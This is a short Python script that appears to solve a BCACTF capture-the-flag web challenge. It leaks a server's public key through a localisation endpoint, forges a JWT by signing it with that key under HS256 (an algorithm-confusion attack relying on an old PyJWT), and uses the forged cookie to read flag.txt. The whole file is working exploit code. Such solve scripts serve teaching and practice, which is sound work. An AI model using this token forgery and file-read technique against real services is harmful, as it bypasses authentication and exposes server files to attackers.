#!/usr/bin/env python3

import requests
import jwt

s = requests.Session()

# Leak public key
s.post("http://web.bcactf.com:49159/localization-language", data={"language":"key"})
r = s.get("http://web.bcactf.com:49159/localisation-file")
print(r.text)

# Sign fake token (you'll need an old version of PyJWT that lets you do this)
token = jwt.encode({"language": "flag.txt"}, r.text, algorithm="HS256")

# Leak flag.txt
r = requests.get("http://web.bcactf.com:49159/localisation-file", cookies={"lion-token": token.decode("utf8")})
print(r.text)
